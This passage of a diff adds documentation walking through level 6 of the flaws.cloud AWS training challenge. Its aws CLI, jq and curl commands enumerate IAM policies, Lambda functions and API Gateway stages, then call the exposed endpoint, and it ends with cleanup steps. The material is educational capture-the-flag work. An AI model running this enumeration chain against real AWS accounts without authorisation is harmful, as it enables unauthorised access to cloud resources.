+  jq '.services.iam.credential_report' $LEVEL6-scout2.json
+  jq '.services.iam.permissions' $LEVEL6-scout2.json
+  jq '.services.iam.policies' $LEVEL6-scout2.json
+  jq '.services.iam.roles' $LEVEL6-scout2.json
+  jq '.services.iam.users' $LEVEL6-scout2.json
+
+  # Investigate Level6 user
+  aws --profile $LEVEL6 iam get-user
+  aws --profile $LEVEL6 iam list-attached-user-policies --user-name $LEVEL6 | tee $LEVEL6-user-policies.json
+
+  # Level6 has list_apigateways policy attached
+  POLICYARN=$(jq -r '.AttachedPolicies[0].PolicyArn' $LEVEL6-user-policies.json)
+  aws --profile $LEVEL6 iam get-policy --policy-arn $POLICYARN | tee $LEVEL6-policy-version.json
+  POLICYVER=$(jq -r '.Policy.DefaultVersionId' $LEVEL6-policy-version.json)
+  aws --profile $LEVEL6 iam get-policy-version --policy-arn $POLICYARN --version-id $POLICYVER \
+    | tee $LEVEL6-policy.json
+  # This allows "apigateway:GET" on "arn:aws:apigateway:us-west-2::/restapis/*"
+
+  # See if there are any lambda functions (available via apigateway)
+  aws --profile $LEVEL6 --region $REGION lambda list-functions | tee $LEVEL6-lambda-functions.json
+  # Function Level6 available
+  FUNCTION=$(jq -r '.Functions[0].FunctionName' $LEVEL6-lambda-functions.json)
+  aws --profile $LEVEL6 --region $REGION lambda get-policy --function-name $FUNCTION \
+    | sed 's/"{/{/g;s/}"/}/g;s/\\"/"/g' | jq '.' | tee $LEVEL6-lambda-policy.json
+  # The function is available at "arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6"
+
+  # The lambda function is callable via:
+  #   https://s33ppypa75.execute-api.us-west-2.amazonaws.com/LAMBDA_STAGE/level6
+  # We're missing the LAMBDA_STAGE
+  SOURCEARN=$(jq -r '.Policy.Statement[].Condition.ArnLike."AWS:SourceArn"' $LEVEL6-lambda-policy.json)
+  RESTAPI=${SOURCEARN##*:}; RESTAPI=${RESTAPI%%/*}
+  LAMBDA_REGION=$(echo $SOURCEARN | cut -d: -f4)
+  aws --profile $LEVEL6 --region $REGION apigateway get-stages --rest-api-id "$RESTAPI" \
+    | tee $LEVEL6-apigw-stages.json
+  LAMBDA_STAGE=$(jq -r '.item[0].stageName' $LEVEL6-apigw-stages.json)
+
+  # Fire off the lambda function
+  curl --insecure https://$RESTAPI.execute-api.$LAMBDA_REGION.amazonaws.com/$LAMBDA_STAGE/${FUNCTION,,}
+  # Output: "Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
+
+And visiting http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/ concludes the exploit part.
+
+
+Cleaning Up
+===========
+
+Follow the instructions above to :ref:`delete the EC2 instance <flaws-delete-instance>`, followed by :ref:`delete the $HACKER user & SSH keys <flaws-delete-user>`, then manually clean up the added profiles in :file:`~/.aws/config` and :file:`~/.aws/credentials`.
